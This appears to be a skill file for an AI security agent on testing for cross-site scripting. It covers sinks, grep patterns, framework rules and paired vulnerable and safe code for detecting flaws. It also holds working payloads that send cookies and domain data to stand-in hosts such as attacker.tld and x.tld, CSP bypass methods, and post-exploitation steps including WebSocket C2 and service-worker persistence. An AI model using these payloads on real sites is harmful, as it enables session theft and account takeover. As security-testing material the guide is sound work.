---
name: xss
description: XSS testing covering reflected, stored, and DOM-based vectors with CSP bypass techniques
---

# XSS

Cross-site scripting persists because context boundaries, parser behavior, and framework-specific edges combine in non-obvious ways. Every user-influenced string must be treated as untrusted until it has been strictly encoded for the exact sink it reaches, and guarded by a runtime policy such as CSP or Trusted Types.

## Class Boundaries

**What XSS IS** — unescaped, unsanitized user input reaching an HTML/JS/DOM output sink:

- **Server-side HTML sinks**: `{{ var | safe }}`, `mark_safe(var)`, `Markup(var)`, `<%- var %>` (EJS), `{{{ var }}}` (Handlebars), `!{var}` (Pug), `th:utext`, `[(${var})]` (Thymeleaf), `{!! $var !!}` (Blade), `raw(var)` / `.html_safe` (Rails), `echo $var` without `htmlspecialchars()`, `@Html.Raw(var)`, `template.HTML(var)` (Go bypass), `render_template_string(f"...{var}...")`, `res.send("<p>" + var + "</p>")`
- **Client DOM sinks**: `innerHTML`/`outerHTML`/`insertAdjacentHTML`, `document.write`, jQuery `.html()`/`.append()`, `dangerouslySetInnerHTML`, `v-html`, `[innerHTML]`, `{@html}`, `bypassSecurityTrustHtml(var)`
- **JS execution sinks**: `eval(var)`, `setTimeout(var, …)` / `setInterval(var, …)` with string args, `new Function(var)()`, `scriptElement.text = var`, event-handler attributes (`onclick`, `href="javascript:…"`), `location.href = var` when scheme is attacker-controlled

**What XSS is NOT** (commonly confused with):

- **CSRF** — forged requests on behalf of a user; separate class
- **Clickjacking** — iframe overlay attacks; separate class
- **HTTP response splitting** — newline injection into response headers; separate class
- **SQLi via XSS** — the SQL injection is the primary finding; XSS is a delivery vector
- **Auto-escaped template output** — `{{ var }}` (Jinja2/Django/Twig/Handlebars with escaping on), `<%= var %>` (EJS), `@var` (Razor), `th:text` (Thymeleaf)
- **`textContent` / `innerText`** — plain text only; no HTML parsing

## Where to Look

**Types**
- Reflected, stored, and DOM-based XSS across web, mobile, and desktop shells

**Contexts**
- HTML, attribute, URL, JS, CSS, SVG/MathML, Markdown, PDF

**Frameworks**
- React/Vue/Angular/Svelte sinks, template engines, SSR/ISR rendering pipelines

**Defenses to Bypass**
- CSP/Trusted Types, DOMPurify, framework auto-escaping mechanisms

## Sink Locations

**Server Render**
- Templates (Jinja/EJS/Handlebars), SSR frameworks, email and PDF renderers

**Client Render**
- `innerHTML`/`outerHTML`/`insertAdjacentHTML`, template literals
- `dangerouslySetInnerHTML`, `v-html`, `$sce.trustAsHtml`, Svelte `{@html}`

**URL/DOM**
- `location.hash`/`search`, `document.referrer`, base href, `data-*` attributes

**Events/Handlers**
- `onerror`/`onload`/`onfocus`/`onclick` and `javascript:` URL handlers

**Cross-Context**
- postMessage payloads, WebSocket messages, local/sessionStorage, IndexedDB

**File/Metadata**
- Image/SVG/XML filenames and EXIF fields, office documents processed server-side or client-side

### Recon Indicators (grep-able sink patterns)

Flag any dynamic variable passed to these sinks; taint tracing confirms exploitability.

**Server-side unescaped output**
- Jinja2/Django: `\| safe`, `{% autoescape off %}`, `Markup(`, `mark_safe(`, `format_html(` with user args
- EJS: `<%- `; Handlebars: `{{{`; Pug: `!{`; Twig: `\| raw`; Blade: `{!!`; Thymeleaf: `th:utext`, `[($`
- Rails: `raw(`, `.html_safe`, `<%= raw`; PHP: `echo $`, `print $`, `<?=` without `htmlspecialchars`
- Go: `template.HTML(`, `template.JS(`, `text/template` for HTML; C#: `@Html.Raw(`, `MvcHtmlString.Create(`
- String-built HTML: `res.send("<`, `f"<.*{var}`, `render_template_string(f`

**Client DOM / JS sinks**
- `.innerHTML\s*=`, `.outerHTML\s*=`, `insertAdjacentHTML(`, `document\.write(`
- jQuery: `\.html\(`, `\.append\(`, `\$\('<.*' \+`
- React: `dangerouslySetInnerHTML`; Vue: `v-html`; Angular: `\[innerHTML\]`, `bypassSecurityTrust`
- `eval\(`, `new Function\(`, `setTimeout\(\s*\w+`, `setInterval\(\s*\w+` (string arg, not function ref)
- URL sinks: `location\.(href|replace|assign)\s*=`, `.setAttribute\(['"]href`, `.src\s*=`, `.action\s*=`

**DOM-based sources** (pair with any sink above)
- `location\.(search|hash|href)`, `document\.(referrer|URL|cookie)`, `window\.name`, `postMessage` / `event\.data`, `URLSearchParams`, `localStorage` / `sessionStorage`

## Context Encoding Rules

- **HTML text**: encode `< > & " '`
- **Attribute value**: encode `" ' < > &` and ensure the attribute is quoted; unquoted attributes must never carry user data
- **URL/JS URL**: encode and validate scheme against an allowlist (https/mailto/tel); reject javascript and data schemes
- **JS string**: escape quotes, backslashes, and newlines; prefer `JSON.stringify`
- **CSS**: avoid injecting into style rules; sanitize property names and values; watch for `url()` and `expression()`
- **SVG/MathML**: treat as active content; many elements execute via onload or animation events

## Vulnerability Patterns

### DOM XSS

**Sources**
- `location.*` (hash/search), `document.referrer`, postMessage, storage, service worker messages

**Sinks**
- `innerHTML`/`outerHTML`/`insertAdjacentHTML`, `document.write`
- `setAttribute`, `setTimeout`/`setInterval` when called with string arguments
- `eval`/`Function`, `new Worker` with blob URLs

**Vulnerable Pattern**
```javascript
const q = new URLSearchParams(location.search).get('q');
results.innerHTML = `<li>${q}</li>`;
```
Exploit: `?q=<img src=x onerror=fetch('//x.tld/'+document.domain)>`

### Mutation XSS

Leverage browser parser repair behavior to transform safe-looking markup into executable code (e.g., noscript, malformed tags):
```html
<noscript><p title="</noscript><img src=x onerror=alert(1)>
<form><button formaction=javascript:alert(1)>
```

### Template Injection

Server or client templates evaluating expressions (AngularJS legacy, Handlebars helpers, lodash templates):
```
{{constructor.constructor('fetch(`//x.tld?c=`+document.cookie)')()}}
```

### CSP Bypass

- Weak policies: missing nonces/hashes, wildcard source entries, `data:` or `blob:` permitted, inline events allowed
- Script gadgets: JSONP endpoints, libraries that expose function constructors
- Import maps or modulepreload directives with insufficiently scoped policies
- Base tag injection to retarget relative script URLs to attacker-controlled origins
- Dynamic module import through permitted origins

### Trusted Types Bypass

- Custom policies that return unsanitized strings; abuse of whitelisted policy names
- Sinks not covered by Trusted Types (CSS, URL handlers) exploited through available gadgets

## Polyglot Payloads

Maintain a compact, context-tuned set:
- **HTML node**: `<svg onload=alert(1)>`
- **Attr quoted**: `" autofocus onfocus=alert(1) x="`
- **Attr unquoted**: `onmouseover=alert(1)`
- **JS string**: `"-alert(1)-"`
- **URL**: `javascript:alert(1)`

## Framework-Specific

### React

- Primary sink: `dangerouslySetInnerHTML`
- Secondary: event handlers or URL values sourced from untrusted input
- Bypass patterns: unsanitized HTML flowing through third-party libraries; custom renderers that use innerHTML internally

### Vue

- Sinks: `v-html` and dynamic attribute bindings
- SSR hydration mismatches can cause the browser to re-interpret server-supplied content

### Angular

- Legacy expression injection (pre-1.6)
- `$sce` trust APIs misused to whitelist attacker-controlled markup

### Svelte

- Sinks: `{@html}` and dynamic attribute expressions

### Meta-Frameworks (SSR Sinks)

**Next.js**
- `dangerouslySetInnerHTML` in server components or pages — same risk as client React
- `getServerSideProps` / `getStaticProps` returning unsanitized HTML that reaches `dangerouslySetInnerHTML`
- `next/head` with user-controlled `<script>` or meta content injection
- API routes (`pages/api/`) returning HTML responses with user data — treated as server-rendered XSS

**Nuxt (Vue SSR)**
- `v-html` in SSR-rendered components — HTML injected during server render is sent to all clients
- `useAsyncData` / `useFetch` returning unsanitized content rendered via `v-html`
- Nuxt `server/api/` handlers returning HTML with user input

**SvelteKit**
- `{@html userInput}` in SSR-rendered `.svelte` components — same as client-side but affects all users
- `+page.server.ts` / `+layout.server.ts` load functions returning unsanitized data that reaches `{@html}`
- Form actions returning HTML content with user-controlled values

**Key principle**: SSR XSS is typically **stored-equivalent** in severity because the malicious output is rendered server-side and served to every requesting client, not just the attacker's browser.

### Markdown/Richtext

- Many renderers pass HTML through by default; plugins may re-enable raw HTML output
- Sanitize after rendering; prohibit inline HTML or constrain to a minimal safe element set

## Special Contexts

### Email

- Most clients strip script elements but permit CSS rules and remote content loading
- Restrict testing to CSS and URL-based techniques where JS execution is not expected

### PDF and Docs

- PDF engines may execute JavaScript inside annotations or form submit actions
- Test `javascript:` in link and submit action fields

### File Uploads

- SVG and HTML files served with `text/html` or `image/svg+xml` content types can execute inline scripts
- Confirm content-type enforcement and `Content-Disposition: attachment` headers
- Watch for MIME sniffing bypasses; require `X-Content-Type-Options: nosniff`

## Post-Exploitation

- Session and token exfiltration: prefer fetch/XHR over image beacons for reliability
- Real-time control: WebSocket C2 channel with a constrained command set
- Persistence: service worker registration; localStorage or script gadget re-injection
- Impact paths: role hijack, CSRF chaining, internal port scanning via fetch, credential phishing overlays

## Analysis Workflow

1. **Identify sources** — URL/query/hash/referrer, postMessage, storage, WebSocket, server-injected JSON
2. **Trace to sinks** — Follow data flow from each source to its eventual sink
3. **Classify context** — HTML node, attribute, URL, script block, event handler, eval-like JS, CSS, SVG
4. **Assess defenses** — Output encoding, sanitizer configuration, CSP headers, Trusted Types enforcement, DOMPurify config
5. **Craft payloads** — Minimal context-specific payloads with encoding, whitespace, and casing variants
6. **Multi-channel** — Exercise all transports: REST, GraphQL, WebSocket, SSE, service workers

## Confirming a Finding

1. Supply the minimal payload alongside context (sink type) with before-and-after DOM state or network evidence
2. Demonstrate cross-browser execution where behavior diverges, or explain parser-specific mechanics
3. Show that stated defenses are bypassed — sanitizer settings, CSP headers, Trusted Types — with concrete proof
4. Quantify impact beyond proof-of-concept: data accessed, action performed, persistence achieved

**Dynamic test / PoC signals**

| XSS type | Payload | Expected signal |
|----------|---------|-----------------|
| Reflected (HTML body) | `?q=<img src=x onerror=alert(1)>` or `<script>alert(1)</script>` | Unescaped markup/script in response body; alert or DOM node injection |
| Stored | Submit `<img src=x onerror=fetch('//attacker.tld?c='+document.cookie)>` via profile/comment field; reload as victim | Payload persists and executes for other users |
| DOM-based (hash) | Visit `/#<img src=x onerror=alert(1)>` | Script runs client-side with no server echo; check `location.hash` → sink trace |
| Attribute context | `" autofocus onfocus=alert(1) x="` | Breaks out of quoted attribute; event fires on focus |
| `javascript:` URL | `javascript:alert(1)` in href/src/action param | Navigation or iframe load executes JS |

Use `fetch('//attacker.tld/log?'+document.cookie)` instead of `alert()` for impact PoCs. Capture response Content-Type — HTML sinks require `text/html`; JSON responses are not XSS unless a client parses and injects them.

## Safe Patterns

When these appear immediately before or at the sink, downgrade or exclude:

**Auto-escaping (engine defaults on)**
```jinja2
{{ var }}          {# Jinja2/Django — HTML-escaped #}
```
```html
<%= var %>         <!-- EJS escaped -->
{{ var }}          <!-- Handlebars double-brace -->
= var              <!-- Pug escaped -->
th:text="${var}"   <!-- Thymeleaf -->
@var               <!-- Razor -->
```

**Explicit escaping**
```php
echo htmlspecialchars($var, ENT_QUOTES, 'UTF-8');
```
```ruby
<%= h(var) %>
```
```jsp
<c:out value="${var}"/>
```

**Safe DOM writes**
```javascript
element.textContent = userInput;   // no HTML parsing
element.innerText = userInput;
```

**Allowlist sanitization**
```javascript
element.innerHTML = DOMPurify.sanitize(userInput);
const clean = sanitizeHtml(userInput, { allowedTags: [], allowedAttributes: {} });
```

**Framework text interpolation (not raw HTML sinks)**
```jsx
return <div>{userInput}</div>;     // React auto-escaped
```
```html
<div>{{ userInput }}</div>         <!-- Angular/Vue interpolation -->
```

## Common False Alarms

- Reflected content that is correctly encoded for the exact context it appears in
- CSP policies enforcing nonces or hashes with no inline events and no dangerous sources
- Trusted Types enforced on all relevant sinks; DOMPurify configured in strict mode with URI allowlists
- Scriptable contexts disabled, raw HTML passthrough prohibited, and safe URL schemes enforced
- `@RestController` returning `application/json` — not an HTML sink
- Express/Fastify handlers setting `Content-Type: application/json` before `send`
- Thymeleaf `th:text` and React `{variable}` text interpolation (not `th:utext` / `dangerouslySetInnerHTML`)
- URI-encoding sanitizer on URL attributes (C# URL sanitizers)
- DOM XSS where data flows only to `textContent`/`innerText`
- JSON/plain-text responses with non-HTML Content-Type; framework auto-escape (`th:text`, React JSX text); DOMPurify/sanitizer barriers; numeric/boolean output

## Business Risk

- Session hijacking and credential theft
- Account takeover via token exfiltration
- CSRF chaining to drive unauthorized state-changing actions
- Malware distribution and phishing via injected content
- Persistent compromise through service worker registration

## Analyst Notes

1. Begin with context classification rather than payload brute force
2. Use DOM instrumentation to log sink activity and uncover unexpected data flows
3. Maintain a small, curated payload set organized by context; iterate with encoding and casing variants
4. Validate defenses by inspecting their configuration and running negative tests
5. Prefer impact-driven PoCs — exfiltration, CSRF chains — over bare alert boxes
6. Treat SVG and MathML as first-class active content; test them independently
7. Rerun tests across different transports and render paths — SSR, CSR, and hydration behave differently
8. Probe CSP and Trusted Types policies intentionally: attempt to violate them and capture the resulting violation reports

## Core Principle

Context and sink together determine whether execution occurs. Encode precisely for the target context, enforce runtime policies through CSP and Trusted Types, and validate every alternative render path. Compact, well-evidenced payloads outperform exhaustive payload catalogs.

## Java Source Detection Rules

### TRUE POSITIVE: Unescaped data in server-generated HTML
- Untrusted data from `@RequestParam`, `request.getParameter(...)`, path variables, headers, or database fields is concatenated or interpolated into HTML markup returned to the browser.
- Java sinks include `ResponseEntity<String>`, `@ResponseBody String`, servlet/JSP writers, or template fragments that build HTML with `String.format(...)`, `+`, or `StringBuilder` without HTML encoding.
- Thymeleaf `th:utext` rendering of untrusted model data is a true positive because it outputs raw HTML.

### TRUE POSITIVE: Stored XSS during HTML rendering
- Data loaded from persistence such as `ResultSet.getString(...)`, entity fields, or repository results is still untrusted when inserted into HTML without contextual encoding.
- A database round-trip does not make the value safe; the finding depends on the final HTML sink.
- `th:text` is only safe for normal HTML text nodes; inside `<script ... th:text="${...}"></script>` or other JavaScript sink contexts it should still be treated as executable `xss`.
- Java handlers that assemble HTML or JavaScript with `StringBuilder`, `String.format`, `append(...)`, or JSP fragments from request or database values are `xss` when the response is browser-rendered, including directory listings and AJAX HTML fragments.

### FALSE POSITIVE: Escaped template output
- Thymeleaf `th:text` escapes HTML by default and should not be flagged unless there is separate evidence that escaping is bypassed or disabled.
- Template output that uses framework HTML escaping is not a finding without a raw-output sink.

### FALSE POSITIVE: JSON-only responses
- `@RestController` responses, Jackson JSON serialization, or `application/json` echoes are not XSS by themselves because they are not HTML or JavaScript rendering sinks.
- Do not report XSS when the only server-side behavior shown is returning JSON or plain data with no browser rendering step.
## Python/JS/PHP Source Detection Rules

### Python (Jinja2 / Flask)
- **VULN**: `render_template_string(user_input)` — template content is user-controlled
- **VULN**: `Markup(user_input)` or `markupsafe.Markup(user_input)` — marks attacker string as safe HTML
- **VULN**: `{{ var | safe }}` in template where `var` comes from a request parameter
- **SAFE**: `render_template('page.html', name=user_input)` — framework auto-escapes variables

### JavaScript (DOM / React / Vue)
- **VULN**: `element.innerHTML = userInput` — direct DOM sink
- **VULN**: `document.write(userInput)`, `element.outerHTML = userInput`
- **VULN**: `dangerouslySetInnerHTML={{ __html: userInput }}` — React explicit unsafe HTML
- **VULN**: `v-html="userInput"` — Vue directive renders raw HTML
- **SAFE**: `element.textContent = userInput`, `element.innerText = userInput`
- **SAFE**: React JSX `<div>{userInput}</div>` — auto-escaped by React

### URL-Scheme Sinks (`javascript:` / `data:` class)
Auto-escaping protects HTML *text/attribute* context but NOT a URL that is later navigated or used as a script/iframe source. Treat any user-controlled value flowing into an href/src/action-like sink as a scheme-injection sink unless the scheme is allowlisted to `http(s)`/`mailto`/`tel`.
- **VULN**: `<a href={userUrl}>` / `window.location = userUrl` / `location.href = userUrl` / `el.src = userUrl` where `userUrl` may be `javascript:...` or `data:text/html,...`
- **VULN**: `<iframe src={userUrl}>`, `<form action={userUrl}>`, `<object data={userUrl}>`, `el.setAttribute('href', userUrl)`
- **VULN**: serving/returning fetched or uploaded **SVG** inline (`image/svg+xml` or `text/html`) — SVG executes inline script; see Image-Proxy SSRF in `ssrf.md`
- **Note**: React blocks `javascript:` in JSX URL props (warns since 16.9), but `data:` URLs, non-React DOM writes, and `setAttribute` still execute; do not assume the framework covers this.
- **SAFE**: validate scheme against an allowlist before use — `if (!/^https?:/i.test(url)) reject()`; React JSX `<div>{userInput}</div>` for non-URL text

### PHP
- **VULN**: `echo $_GET['name']` — no escaping
- **VULN**: `echo $_POST['msg']` — no escaping
- **VULN**: `print $userInput` — no escaping
- **SAFE**: `echo htmlspecialchars($_GET['name'], ENT_QUOTES, 'UTF-8')`
- **SAFE**: `echo htmlentities($userInput, ENT_QUOTES, 'UTF-8')` — ENT_QUOTES required for attribute contexts (default ENT_COMPAT leaves single quotes unencoded)

## Vulnerable vs Secure Examples

Framework pairs not covered above. Match stack before citing.

### Python — Django

```python
# VULN: mark_safe() bypasses auto-escaping
safe_bio = mark_safe(request.GET.get('bio', ''))

# SECURE: pass raw string; template {{ bio }} auto-escapes
return render(request, 'bio.html', {'bio': request.GET.get('bio', '')})
```

### Node.js — Express (string concat)

```javascript
// VULN: user input in HTML response
res.send(`<h1>Results for: ${req.query.q}</h1>`);

// SECURE: escape manually or use auto-escaping template
const escapeHtml = require('escape-html');
res.send(`<h1>Results for: ${escapeHtml(req.query.q)}</h1>`);
```

### EJS / Handlebars

```html
<!-- VULN -->
<div><%- userInput %></div>
<div>{{{ userInput }}}</div>

<!-- SECURE -->
<div><%= userInput %></div>
<div>{{ userInput }}</div>
```

### Ruby on Rails

```erb
<%# VULN %>
<%= raw(@user.bio) %>
<%= @user.bio.html_safe %>

<%# SECURE %>
<%= @user.bio %>
```

### Java — JSP

```jsp
<%-- VULN --%>
<p>Hello, <%= request.getParameter("name") %></p>
<p>Hello, ${param.name}</p>

<%-- SECURE --%>
<p>Hello, <c:out value="${param.name}"/></p>
```

### Go — html/template

```go
// VULN: text/template or template.HTML() cast bypasses escaping
import "text/template"
name := template.HTML(r.URL.Query().Get("name"))

// SECURE: html/template with plain string — auto-escaped
import "html/template"
tmpl.Execute(w, struct{ Name string }{Name: r.URL.Query().Get("name")})
```

### C# — Razor

```csharp
// VULN
@Html.Raw(userInput)

// SECURE
@userInput
```

### Angular — DomSanitizer bypass

```typescript
// VULN: bypass with user-controlled input
this.sanitizer.bypassSecurityTrustHtml(userInput);

// SECURE: interpolation auto-escapes
// template: <div>{{ userInput }}</div>
```

## Java Servlet Patterns (CWE-79)

**VULN** — tainted input written directly to HTTP response:
```java
PrintWriter out = response.getWriter();
out.println("<p>" + tainted + "</p>");
out.print(tainted);
response.getWriter().println(tainted);
```

**SAFE** — tainted input is HTML-encoded before output:
```java
ESAPI.encoder().encodeForHTML(tainted)
StringEscapeUtils.escapeHtml4(tainted)
```

**Decision rule**: tainted data reaches `PrintWriter.print`/`println`/`write` without encoding → **VULN**. ESAPI or equivalent encoding → **SAFE**.

**Edge cases**:
- `response.getWriter().println(bar.toCharArray())` is **VULN** when `bar` is tainted — converting to `char[]` does not sanitize output.
- `response.getWriter().format(locale, bar, obj)` is **VULN** when `bar` itself is tainted and used as the format string.
- `printf`/`format` with a **fixed** format string is **SAFE** when every inserted argument is fixed or already HTML-encoded.

## Source -> Sink Pattern

**Sources**
- Active threat-model sources — request params, body, headers, cookies (all languages)
- JavaScript reflected: HTTP request input access with third-party controllable inputs; `Referer` header
- JavaScript DOM: `location.hash/search`, `document.referrer`, `postMessage`, storage
- JavaScript stored: filenames, torrent metadata, database reads

**Sinks**
- **Java**: `PrintWriter.print/println/write/format/append`; Spring `@ResponseBody` HTML; JSF/JAX-RS writers; `WebView.loadData`; model sinks `html-injection`, `js-injection`
- **JavaScript reflected**: HTTP response send arguments when Content-Type is HTML-like (`text/html`, `application/xhtml+xml`, `image/svg+xml`, etc.)
- **JavaScript DOM**: `innerHTML`/`outerHTML`, jQuery HTML methods, Angular `$compile`, `document.write`, `setAttribute`, `eval`/`Function`/`setTimeout(string)`, React `dangerouslySetInnerHTML`, `{@html}`, `v-html`
- **JavaScript**: HTML string concat reaching XSS sink; error pages writing tainted data to response
- **Python**: `HttpResponse` body where mimetype is `text/html`
- **C#**: Razor/HTML writers, `Response.Write`, Blazor render fragments; ASP inline `Request.QueryString`
- **Ruby**: ERB output; unsafe HTML construction

**Sanitizers / barriers**
- Java: `HtmlUtils.htmlEscape` (and `html_?escape.*` methods); numeric/boolean types; model `html-injection`/`js-injection` barriers
- JavaScript: HTML metachar `replace` chains; `encodeURI`/`encodeURIComponent`; `JSON.stringify`; JavaScript serialization sanitizer; model `html-injection` barriers
- Python: HTML escaping output (e.g., `html.escape`, MarkupSafe); constant-comparison barriers
- C#: HTML and URL sanitizers; numeric parse; model barriers
- Reflected XSS skips sinks when route sets safe Content-Type (non-HTML MIME)
